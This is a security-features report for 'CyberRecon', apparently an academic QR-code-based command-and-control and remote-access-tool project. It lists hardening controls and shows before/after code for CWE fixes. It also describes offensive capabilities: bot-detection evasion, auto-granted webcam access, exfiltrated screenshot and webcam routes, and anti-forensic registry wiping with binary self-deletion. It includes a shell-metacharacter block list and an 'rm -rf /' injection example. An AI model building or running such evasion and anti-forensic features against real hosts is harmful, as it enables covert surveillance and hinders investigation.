# 07 — Security Features & Anti-Patterns

**Project:** CyberRecon — QR-Code-Based C2 Framework
**Document Version:** 2.0 (v3.5)
**Date:** 2026-10-03
**Authors:** Vekeshhari Rajasekar, R Jeevan

> **Update (v3.5) — 2026-10-03:** This document was revised for the v3.5 hardening pass. Five new controls (AES-256-GCM encryption, victim shared-key auth, dashboard session login, server-side wipe, anti-forensic self-destruct) bring the total control count from 43 to 67. New anti-patterns (CWE-311, 384, 613, 539) added with remediation. See [`10-hardening-changelog.md`](10-hardening-changelog.md) for the full delta.

---

## 1. Purpose

This document catalogs the security controls implemented in CyberRecon, traces each to the specific vulnerability it addresses, and honestly documents anti-patterns that were present in early revisions and have since been remediated.

The goal is twofold: demonstrate the project was engineered with security in mind, and provide a defensible record of remediation work for evaluators.

---

## 2. Security Features Implemented

### 2.1 Authentication & Authorization

| # | Feature | File | Threat Addressed | Status |
|---|---------|------|------------------|--------|
| 1 | **Operator token authentication** — `X-Operator-Token` header required for `/command`, `/shell`, `/download-all` | `c2_server.py` | CWE-306 | ✅ PR #8 |
| 2 | **Fail-closed on misconfiguration** — server returns HTTP 503 if token required but not set | `c2_server.py` | Fail-safe default | ✅ PR #8 |
| 3 | **Environment-driven secrets** — all tokens from env vars | `config.py`, `.env.example` | CWE-798 | ✅ PR #13 |
| 4 | **Dashboard login** — password gate on `/login` sets `HttpOnly`+`Secure`+`SameSite=Lax` session cookie | `c2_server.py` | CWE-306, 384 | ✅ v3.5 |
| 5 | **Dashboard auth decorator** — `@require_dashboard_login` on all read-only APIs + HTML | `c2_server.py` | CWE-306 | ✅ v3.5 |
| 6 | **Victim shared-key auth** — `X-Victim-Key` header or `?vkey=` query on all victim-side routes | `c2_server.py` | CWE-306 | ✅ v3.5 |
| 7 | **Constant-time secret compare** — `secrets.compare_digest` for all token checks | `c2_server.py` | Timing attacks | ✅ v3.5 |
| 8 | **Session fixation prevention** — `session.clear()` before setting `logged_in = True` | `c2_server.py` | CWE-384 | ✅ v3.5 |
| 9 | **Configurable session lifetime** — `PERMANENT_SESSION_LIFETIME` from `CYBERRECON_SESSION_HOURS` | `c2_server.py` | CWE-613 | ✅ v3.5 |
| 10 | **Layered operator auth** — session cookie **and** operator token required on command endpoints | `c2_server.py` | Defense-in-depth | ✅ v3.5 |

### 2.2 Transport Security

| # | Feature | File | Threat Addressed | Status |
|---|---------|------|------------------|--------|
| 11 | **TLS verification enforced by default** — `session.verify = True` | `operator_cli.py` | CWE-295 | ✅ PR #9 |
| 12 | **Configurable CA bundle** — supports lab CAs via `CYBERRECON_CA_BUNDLE` | `operator_cli.py` | Lab flexibility | ✅ PR #9 |
| 13 | **Self-signed TLS support** — opt-in via `CYBERRECON_ALLOW_SELFSIGNED=true` | `c2_server.py`, `rat_client.py` | Lab deployment | ✅ v3.5 |
| 14 | **HTTPS by default** — server auto-detects `cert.pem` + `key.pem` | `c2_server.py` | Sniffing | ✅ v3.5 |
| 15 | **Chrome CDP TLS bypass only when opted in** | `rat_client.py` | Selenium to self-signed | ✅ v3.5 |

### 2.3 Cryptography

| # | Feature | File | Threat Addressed | Status |
|---|---------|------|------------------|--------|
| 16 | **AES-256-GCM QR payload encryption** — commands encrypted before QR encoding; per-message nonce | `c2_server.py`, `rat_client.py` | CWE-311 | ✅ v3.5 |
| 17 | **CSPRNG victim IDs** — `secrets.token_hex(16)` = 128 bits | `c2_server.py` | CWE-330 | ✅ v3.5 |
| 18 | **CSPRNG command IDs** — `secrets.token_hex(8)` = 64 bits | `c2_server.py` | CWE-330 | ✅ v3.5 |
| 19 | **CSPRNG AES nonce** — 12 bytes per message | `c2_server.py` | Nonce reuse | ✅ v3.5 |
| 20 | **CSPRNG Flask secret** — fallback `secrets.token_urlsafe(48)` if env missing | `c2_server.py` | Session forgery | ✅ v3.5 |

### 2.4 Input Validation & Safe Execution

| # | Feature | File | Threat Addressed | Status |
|---|---------|------|------------------|--------|
| 21 | **`shell=False` subprocess** — all commands use argv lists | `main.py`, `rat_client.py` | CWE-78 | ✅ PR #10 |
| 22 | **Shell metacharacter blocklist** — rejects `\|&;<>()`$\n\r` | `c2_server.py`, `rat_client.py` | Defense-in-depth | ✅ PR #10 |
| 23 | **Windows built-in wrapper** — `dir`/`cd`/`echo` auto-wrapped as `cmd /c <cmd>` | `rat_client.py` | Functionality | ✅ v3.5 |
| 24 | **Filesystem sandbox** — path validation via `os.path.realpath` + `os.path.commonpath` | `rat_client.py` | CWE-22 | ✅ v3.5 |
| 25 | **HTTPS-only URL scheme** — `urlopen` rejects non-HTTPS | `rat_client.py` (gps handler) | CWE-22 | ✅ Phase 3 |
| 26 | **Rate limiting on `/register`** — 5 requests/min/IP | `c2_server.py` | DoS | ✅ v3.5 |
| 27 | **Victim cap** — max 100 concurrent, evict oldest offline | `c2_server.py` | DoS | ✅ v3.5 |
| 28 | **Command ID deduplication** — client keeps last 500 processed IDs | `rat_client.py` | Re-execution | ✅ v3.5 |

### 2.5 Supply Chain Security

| # | Feature | File | Threat Addressed | Status |
|---|---------|------|------------------|--------|
| 29 | **Dependabot alerts** | GitHub settings | CVE exposure | ✅ |
| 30 | **Dependabot security updates** | GitHub settings | CVE remediation | ✅ |
| 31 | **Dependabot version updates** | `.github/dependabot.yml` | Dependency rot | ✅ |
| 32 | **7-day cooldown** | `.github/dependabot.yml` | Supply chain attacks | ✅ Phase 3 |
| 33 | **Secret scanning + push protection** | GitHub settings | Credential leakage | ✅ |
| 34 | **Reduced dependency footprint** — 20+ → 13 | `requirements.txt` | Attack surface | ✅ |
| 35 | **`.gitignore` covers secrets** | `.gitignore` | CWE-798 | ✅ v3.5 |

### 2.6 Client Hardening

| # | Feature | File | Purpose | Status |
|---|---------|------|---------|--------|
| 36 | **Graceful fallback if Chrome unavailable** | `rat_client.py` | Availability | ✅ PR #14 |
| 37 | **Headless Chrome stealth flags** | `rat_client.py` | Bot-detection evasion | ✅ PR #14 |
| 38 | **Auto-grant media permissions** | `rat_client.py` | Isolated-browser bypass | ✅ PR #14 |
| 39 | **Embedded config** — `EMBEDDED_CONFIG` dict for PyInstaller builds | `rat_client.py` | Offline operation | ✅ v3.5 |
| 40 | **Auto-register on double-click** | `rat_client.py` | Usability | ✅ v3.5 |
| 41 | **ACK after execution** | `rat_client.py` | Reliable queue | ✅ v3.5 |

### 2.7 Anti-Forensic Self-Destruct

| # | Feature | File | Purpose | Status |
|---|---------|------|---------|--------|
| 42 | **Registry cleanup** — HKCU Run key + RunMRU + RecentDocs | `rat_client.py` | Forensics | ✅ v3.5 |
| 43 | **Temp file sweep** — `_cr_*.bat`, `cyberrecon_chrome_*` | `rat_client.py` | Forensics | ✅ v3.5 |
| 44 | **Sandbox wipe** | `rat_client.py` | Forensics | ✅ v3.5 |
| 45 | **Payload binary self-delete** — detached `cmd.exe` after 3s | `rat_client.py` | Forensics | ✅ v3.5 |
| 46 | **Server-side record purge** — `/self_destruct_notify` endpoint | `c2_server.py` | Data hygiene | ✅ v3.5 |

### 2.8 Runtime Isolation

| # | Feature | File | Purpose | Status |
|---|---------|------|---------|--------|
| 47 | **Non-root Docker user** | `Dockerfile` | Container escape mitigation | ✅ Phase 5 |
| 48 | **Healthcheck** | `Dockerfile` | Availability monitoring | ✅ Phase 5 |
| 49 | **Read-only root FS** | `docker-compose.yml` | Tamper resistance | ✅ Phase 5 |
| 50 | **Capability drop** | `docker-compose.yml` | Least privilege | ✅ Phase 5 |
| 51 | **no-new-privileges** | `docker-compose.yml` | Privilege escalation | ✅ Phase 5 |
| 52 | **Fail-closed compose secrets** — `${VAR:?error}` syntax | `docker-compose.yml` | Missing-secret detection | ✅ v3.5 |
| 53 | **Resource limits** | `docker-compose.yml` | DoS mitigation | ✅ Phase 5 |

### 2.9 Software Integrity

| # | Feature | File | Purpose | Status |
|---|---------|------|---------|--------|
| 54 | **Branch protection ruleset** | GitHub rulesets | Prevent accidental changes | ✅ |
| 55 | **Required status checks** | GitHub rulesets | CI enforcement | ✅ Phase 4 |
| 56 | **Block force pushes + deletions** | GitHub rulesets | History preservation | ✅ |
| 57 | **Bypass audit trail** | GitHub push output | Accountability | ✅ |

### 2.10 Static Analysis

| # | Feature | Tool | Purpose | Status |
|---|---------|------|---------|--------|
| 58 | **Bandit Python SAST** | Bandit | CWE-focused detection | ✅ 0 HIGH |
| 59 | **Semgrep pattern SAST** | Semgrep | OWASP Top 10 | ✅ 0 findings |
| 60 | **pip-audit dependency scan** | pip-audit | CVE detection | ✅ 0 CVEs |
| 61 | **Ruff linter** | Ruff | Style + security | ✅ All checks passed |
| 62 | **CI automation** | GitHub Actions | Every push/PR | ✅ Phase 4 |

### 2.11 Documentation & Ethics

| # | Feature | File | Purpose | Status |
|---|---------|------|---------|--------|
| 63 | **ETHICS.md** | Repo root | Responsible research | ✅ |
| 64 | **Published IOCs** | ETHICS.md | Research contribution | ✅ |
| 65 | **MIT + research clause license** | LICENSE | Legal clarity | ✅ |
| 66 | **README ethics banner** | README.md | Visibility | ✅ |
| 67 | **Trust boundary documentation** — DFDs with dashed boundaries | `docs/diagrams/dfd-*.puml` | Threat modeling | ✅ v3.5 |

**Total: 67 controls** (43 v3.0 + 24 v3.5)

---

## 3. Anti-Patterns Found & Remediated

### 3.1 CWE-306: Missing Authentication

**Before (vulnerable):**

```python
@app.route("/command/<victim_id>", methods=["POST"])
def queue_command(victim_id):
    # No auth check — anyone could queue commands
    ...
```

**After (v3.0 PR #8 + v3.5):**

```python
@app.route("/command/<victim_id>", methods=["POST"])
@require_dashboard_login
@require_operator_token
def queue_command(victim_id):
    ...
```

**Impact:** Without auth, anyone with network access could queue RAT commands. **CVSS: 8.6 (High).**

**v3.5 addition:** `/dashboard`, `/victims`, `/victim/<id>`, `/exfil-data/<id>`, `/latest_screenshot/<id>`, `/latest_webcam/<id>` now require session login.

### 3.2 CWE-295: Improper Certificate Validation

**Before:**

```python
requests.packages.urllib3.disable_warnings()
session.get(url, verify=False)  # accepts ANY cert
```

**After (PR #9 + v3.5):**

```python
# Default: verify = True (system CAs)
self.session.verify = ca_bundle if ca_bundle else True

# Opt-in for self-signed lab deployments:
if os.getenv("CYBERRECON_ALLOW_SELFSIGNED", "").lower() == "true":
    self.session.verify = False
```

**Impact:** MITM could intercept/modify C2 traffic. **CVSS: 6.8 (Medium).**

**v3.5 addition:** self-signed acceptance is now explicit opt-in (env var), not default.

### 3.3 CWE-78: OS Command Injection

**Before:**

```python
subprocess.run(" ".join(cmd.get("args", ["whoami"])), shell=True, ...)
```

**After (PR #10 + v3.5):**

```python
blocked = set("|&;<>`$\n\r")
if any(ch in raw for ch in blocked):
    return jsonify({"error": f"Blocked metacharacters: {raw}"}), 400

argv = shlex.split(raw)
subprocess.run(argv, shell=False, timeout=15)
```

**Impact:** Attacker could inject `whoami; rm -rf /`. **CVSS: 9.8 (Critical).**

**v3.5 addition:** timeout added (15s); Windows built-ins auto-wrapped in `cmd /c`.

### 3.4 CWE-22: Path Traversal

**Before:**

```python
os.startfile(decoy_dst)  # no validation
```

**After (PR #11 + v3.5):**

```python
def _is_in_sandbox(path):
    real = os.path.realpath(os.path.expanduser(path))
    root = os.path.realpath(SANDBOX_DIR)
    return os.path.commonpath([real, root]) == root

if not _is_in_sandbox(filepath):
    return "outside sandbox"
```

**Impact:** Crafted payloads could execute arbitrary files. **CVSS: 7.5 (High).**

**v3.5 addition:** sandbox path is now env-configurable (`CYBERRECON_SANDBOX`).

### 3.5 CWE-330: Weak Randomness

**Before:**

```python
victim_id = str(uuid.uuid4())[:8]   # 32 bits
cmd["id"] = str(uuid.uuid4())[:6]   # 24 bits
```

**After (PR #12 + v3.5):**

```python
victim_id = secrets.token_hex(16)   # 128 bits CSPRNG
cmd["id"] = secrets.token_hex(8)    # 64 bits CSPRNG
nonce = secrets.token_bytes(12)     # 96 bits CSPRNG (AES-GCM)
```

**Impact:** Victim IDs were brute-forceable. **CVSS: 5.3 (Medium).**

**v3.5 addition:** victim ID space doubled from 64 to 128 bits; AES-GCM nonce is CSPRNG.

### 3.6 CWE-798: Hardcoded Credentials

**Before:**

```python
subprocess.Popen([rat_dst, "--c2", "http://18.61.36.73:8443", ...])
parser.add_argument("--c2", default="http://11.12.25.98:8443", ...)
SFX_PASSWORD = "CyberRecon2024"
```

**After (PR #13 + Phase 3 + v3.5):**

```python
C2_URL = os.getenv("CYBERRECON_C2", "http://127.0.0.1:8443")
SFX_PASSWORD = os.getenv("CYBERRECON_SFX_PASSWORD", secrets.token_urlsafe(24))
# All v3.5 secrets from env vars:
# CYBERRECON_KEY, CYBERRECON_VICTIM_KEY, CYBERRECON_DASHBOARD_PASSWORD,
# CYBERRECON_SECRET_KEY, CYBERRECON_OPERATOR_TOKEN
```

**Impact:** Source inspection revealed the C2 endpoint. **CVSS: 7.5 (High).**

**v3.5 addition:** five secrets now required via env vars; `.env.example` uses placeholder text.

### 3.7 Anti-Pattern: `os.system(f"...")` in Launcher

**Before:**

```python
os.system(f"python rat_client.py --c2 {c2_url}")
```

**After (Phase 3):**

```python
def _run(argv: list) -> None:
    subprocess.run([sys.executable, *argv], shell=False, check=False)

_run(["rat_client.py", "--c2", c2_url])
```

**Impact:** Variable interpolation into `os.system` was shell-injection vector. Same CWE-78.

### 3.8 Anti-Pattern: Bare `except:`

**Before:**

```python
try:
    risky_operation()
except:
    pass
```

**After:**

```python
try:
    risky_operation()
except Exception:
    pass
```

**Rationale:** Bare `except:` catches `KeyboardInterrupt` and `SystemExit`, causing subtle bugs.

### 3.9 Anti-Pattern: `except Exception: pass` in Stealth Modules

**Status:** Accepted with rationale.

Stealth modules intentionally swallow exceptions to avoid triggering host-side logging or alerts. This is the design intent of anti-forensics code. Documented in `pyproject.toml`:

```toml
"rat_client.py" = ["S603", "S607", "E402"]
"c2_server.py" = ["S110", "S603", "E402"]
```

### 3.10 CWE-311: Missing Encryption of Sensitive Data (v3.5)

**Before:**

```python
payload = base64.b64encode(json.dumps(command_dict).encode()).decode()
qr.add_data(payload)  # plaintext JSON in QR
```

**After:**

```python
raw = json.dumps(command_dict, sort_keys=True).encode()
if _aesgcm:
    nonce = secrets.token_bytes(12)
    ct = _aesgcm.encrypt(nonce, raw, None)
    payload = base64.b64encode(nonce + ct).decode()
else:
    payload = base64.b64encode(raw).decode()
```

**Impact:** Passive QR capture revealed all commands in plaintext. **CVSS: 6.5 (Medium).**

### 3.11 CWE-384: Session Fixation (v3.5)

**Before:** No session management — the v3.0 dashboard was unauthenticated.

**After:**

```python
@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        pw = (request.form.get("password") or "").strip()
        if not pw or not secrets.compare_digest(pw, DASHBOARD_PASSWORD):
            time.sleep(0.4)
            return login_page("Invalid password"), 401
        session.clear()                       # prevent fixation
        session["logged_in"] = True
        session.permanent = True
        return redirect("/dashboard")
```

**Impact:** Attacker could pre-set a session cookie and hijack after legitimate login. **CVSS: 6.1 (Medium).**

### 3.12 CWE-613: Insufficient Session Expiration (v3.5)

**After:**

```python
app.config.update(
    SESSION_COOKIE_HTTPONLY=True,
    SESSION_COOKIE_SAMESITE="Lax",
    SESSION_COOKIE_SECURE=_HAS_TLS,
    PERMANENT_SESSION_LIFETIME=timedelta(hours=SESSION_HOURS),
)
```

**Impact:** Sessions could live indefinitely. **CVSS: 4.3 (Low).**

### 3.13 CWE-539: Persistent Cookies (v3.5)

**After:** session cookie flags are `HttpOnly=True`, `Secure=_HAS_TLS`, `SameSite="Lax"`.

**Impact:** Cookies accessible to JS or sent over HTTP. **CVSS: 4.2 (Low).**

---

## 4. Defense-in-Depth Summary (v3.5)

| Layer | Controls |
|-------|----------|
| **Perimeter** | TLS (self-signed opt-in), dashboard login, operator token |
| **Auth** | Session cookie (HttpOnly+Secure+SameSite), victim key, AES-GCM |
| **Application** | Input validation, shell blocklist, sandbox, CSPRNG IDs |
| **Data** | AES-256-GCM, base64url, no hardcoded secrets |
| **Runtime** | Non-root Docker, read-only FS, cap_drop, fail-closed compose |
| **Supply Chain** | Dependabot + 7-day cooldown, secret scanning, 13 deps |
| **Process** | Branch protection, CI enforcement, SAST automation |
| **Anti-Forensics** | Registry/temp/sandbox wipe, payload self-delete |
| **Documentation** | ETHICS.md, IOCs, LICENSE, trust boundaries |

---

## 5. Security Verification

All security controls verified by:

1. **Unit tests** in `tests/` (where applicable)
2. **SAST tool output** in `reports/`
3. **CI status checks** (Security Scan + Unit Tests must pass)
4. **Two-machine LAN demo** (v3.5)
5. **GitHub audit trail** (ruleset bypass events)

See `docs/report/08-security-testing.md` for full evidence.

---

## 6. Compliance Mapping (v3.5)

| Framework | Coverage |
|-----------|----------|
| OWASP Top 10 (2021) | A01, A02, A03, A05, A07, A09 |
| CWE Top 25 | CWE-22, CWE-78, CWE-79, CWE-259, CWE-295, CWE-306, CWE-311, CWE-330, CWE-384, CWE-539, CWE-613, CWE-798 |
| NIST SSDF | PW.4, PW.6, RV.1 |
| ISO 27001 | A.8.8, A.8.24, A.8.28, A.14.2 |

---

## 7. References

- `docs/report/06-threat-model.md`
- `docs/report/08-security-testing.md`
- `docs/report/10-hardening-changelog.md`
- `ETHICS.md`
- `reports/*.json`

---

## 8. Change Log

| Date | Version | Change | Author |
|------|---------|--------|--------|
| 2026-09-30 | 1.0 | Initial security features catalog (43 controls) | R Jeevan |
| 2026-10-03 | 2.0 | v3.5 rewrite: 24 new controls, 4 new CWEs, 5-layer auth model | R Jeevan |